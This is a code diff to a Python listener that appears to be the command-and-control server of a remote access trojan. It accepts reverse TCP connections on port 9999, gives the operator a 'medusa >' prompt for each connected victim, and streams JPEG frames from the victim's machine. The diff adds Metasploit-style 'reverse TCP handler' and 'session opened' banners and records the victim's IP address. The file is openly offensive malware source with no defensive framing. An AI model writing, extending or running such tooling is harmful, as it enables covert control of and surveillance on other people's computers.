@@ -63,7 +63,9 @@ def generate_frames(client_socket):
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
-def handle_client(client_socket):
+def handle_client(client_socket, addr):
+    target_ip, target_port = addr
+    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")
     while True:
         try:
             command = input(Fore.MAGENTA + "medusa > ")
@@ -94,12 +96,13 @@ def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
     server_socket.listen(5)
+    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
     print(Fore.GREEN + "[ * ] Listening for incoming connections...")
 
     while True:
         client_socket, addr = server_socket.accept()
         print(Fore.GREEN + f"[ * ] Connection established from {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
         client_handler.start()
 
 if __name__ == "__main__":
